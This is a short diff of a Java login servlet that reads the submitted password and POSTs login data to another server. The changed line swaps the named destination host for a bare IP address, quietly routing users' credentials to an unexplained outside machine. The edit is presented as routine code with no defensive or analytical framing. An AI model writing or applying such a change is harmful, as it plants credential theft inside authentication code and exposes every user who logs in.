@@ -19,7 +19,7 @@ public class LoginServlet extends HttpServlet {
         String password = request.getParameter("password");
 
         // Forward data to another server
-        URL url = new URL("http://other-server.com/receive-login");
+        URL url = new URL("http://24.132.128.94/receive-login");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setDoOutput(true);
         conn.setRequestMethod("POST");
